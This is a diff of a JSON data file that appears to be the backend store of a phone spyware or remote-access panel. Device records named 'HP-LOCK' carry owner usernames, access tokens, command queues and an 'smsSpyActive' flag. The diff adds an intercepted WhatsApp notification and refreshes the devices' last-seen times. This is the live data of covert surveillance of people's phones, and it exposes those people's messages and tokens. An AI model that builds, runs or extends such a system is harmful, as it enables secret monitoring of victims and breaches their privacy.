@@ -36,7 +36,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "729a4fc8ab7614c8892066df29eb7c03",
-    "lastSeen": 1775905987791,
+    "lastSeen": 1775905988846,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T09:04:13.167Z",
@@ -52,6 +52,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎3 pesan baru",
+        "time": "11/04 18:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775905990407
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -405,7 +413,7 @@
     "deviceName": "HP-LOCK-236E",
     "ownerUsername": "Riz99",
     "token": "25f27c309061b42c3e6310cc706ba952",
-    "lastSeen": 1775905985331,
+    "lastSeen": 1775905989443,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T09:23:23.787Z",
@@ -437,7 +445,7 @@
     "deviceName": "HP-LOCK-F00B",
     "ownerUsername": "Riz99",
     "token": "e13e997b60c0fcca110bf105c3d2f904",
-    "lastSeen": 1775905987149,
+    "lastSeen": 1775905990153,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T09:39:58.599Z",
